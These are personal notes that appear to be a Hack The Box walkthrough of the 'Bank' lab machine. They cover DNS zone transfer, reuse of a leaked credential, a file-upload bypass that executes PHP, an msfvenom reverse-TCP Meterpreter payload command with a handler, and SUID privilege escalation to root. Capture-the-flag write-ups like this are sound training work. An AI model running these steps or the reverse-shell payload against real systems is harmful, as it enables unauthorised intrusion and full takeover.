---
tags: [HTB]
title: Bank
created: '2020-06-02T14:01:54.755Z'
modified: '2020-06-10T19:22:11.431Z'
---

# Bank
- nmap scan shows 80,53,and 22
- looking at the home page browsing to the ip we see it is an apache box.
- doing gobuster gives us nothing though.
- seeing that it is using dns we maybe should try pointing to that and resolving to bank.htb in the case of virtual host routing
- we can use tools like dnsrecon -r 127.0.0.0/24 -n 10.10.10.29 to show a records
- dig axfr bank.htb @10.10.10.29 will show us subdomains
- changing /etc/resolv.conf with nameserver 10.10.10.29 will allow us to browse to it and run dirbuster on it
- once we have dirbuster running there is a directory that shows up called balance-transfer
- balance-transfer shows a ton of encrypted credentials but looking through all of them, there is one that is unencrypted which we can use on login.php
- once we get to the dashboard, there is a support ticket page that we can upload files to
- looking through the source, we can upload .htb to execute as php
- to get a meterpreter shell we can use msfvenom -p php/meterpreter/reverse_tcp lhost=<myhost> lport=<port> -f raw > exp.htb to give us a valid upload
- within msfconsole we set up exploit/multi/handler to give us a meterpreter shell with the correct payload
- we now have a shell and we can use LinEnum to find the SUID binary of emergency within /var/htb/ and running it gives us a root shell immediately.
